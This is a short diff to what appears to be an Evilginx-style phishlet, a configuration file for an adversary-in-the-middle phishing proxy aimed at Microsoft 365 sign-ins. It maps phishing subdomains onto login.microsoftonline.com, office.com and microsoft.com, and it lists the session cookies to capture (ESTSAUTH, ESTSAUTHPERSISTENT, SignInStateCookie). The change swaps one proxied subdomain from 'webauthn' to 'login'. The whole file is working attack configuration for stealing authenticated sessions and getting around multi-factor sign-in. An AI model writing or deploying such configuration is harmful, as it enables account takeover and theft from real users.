@@ -4,7 +4,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'webauthn', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT', 'SignInStateCookie:always']
